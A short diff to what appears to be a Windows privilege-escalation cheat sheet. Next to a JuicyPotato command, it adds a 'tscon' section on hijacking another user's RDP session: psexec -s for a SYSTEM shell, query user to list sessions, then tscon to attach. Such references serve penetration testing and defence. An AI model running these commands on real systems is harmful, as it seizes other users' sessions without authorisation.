@@ -625,6 +625,12 @@ JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-45
     [+] CreateProcessWithTokenW OK
 ```
 
+### tscon
+
+When you are local administrator run `psexec -s -i cmd ` to get shell as nt\system user
+
+then `query user` to have list of connected user (with id) and now you can get RDP session of the user : `cmd /k tscon <id> /dest:console`
+
 ---
 
 ## **DLL hijacking**
